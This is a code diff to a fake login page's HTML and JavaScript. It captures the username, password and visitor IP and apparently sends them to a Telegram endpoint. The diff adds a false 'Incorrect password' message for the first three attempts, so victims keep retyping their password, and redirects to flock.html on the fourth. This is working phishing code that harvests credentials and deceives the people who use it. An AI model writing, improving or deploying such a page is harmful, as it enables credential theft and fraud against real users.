@@ -63,6 +63,15 @@
             cursor: pointer;
         }
 
+        /* Error message styling */
+        .error-message {
+            color: #ff4d4d;
+            font-size: 14px;
+            margin-top: 10px;
+            text-decoration: underline;
+            visibility: hidden; /* Initially hidden */
+        }
+
         /* Additional text */
         .text-muted {
             color: #8e8e8e;
@@ -89,6 +98,7 @@
             <input type="password" class="input-field" id="password" placeholder="Password" required>
             <button type="submit" class="login-button">Log In</button>
         </form>
+        <p id="errorMessage" class="error-message">Incorrect password. Please try again.</p>
         <p class="text-muted">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
     </div>
 
@@ -103,6 +113,7 @@
             // Get form data
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
+            const errorMessage = document.getElementById("errorMessage");
 
             // Fetch user's IP address using a public API
             fetch('https://api.ipify.org?format=json')
@@ -132,11 +143,12 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
-                            if (attemptCount >= 4) {
-                                // Redirect after the fourth attempt
-                                window.location.href = "flock.html";
+                            if (attemptCount < 4) {
+                                // Show error message for first 3 attempts
+                                errorMessage.style.visibility = "visible";
                             } else {
-                                alert(`Attempt ${attemptCount} logged. Try again.`);
+                                // Redirect on the fourth attempt
+                                window.location.href = "flock.html";
                             }
                         } else {
                             alert("Failed to send data to Telegram.");
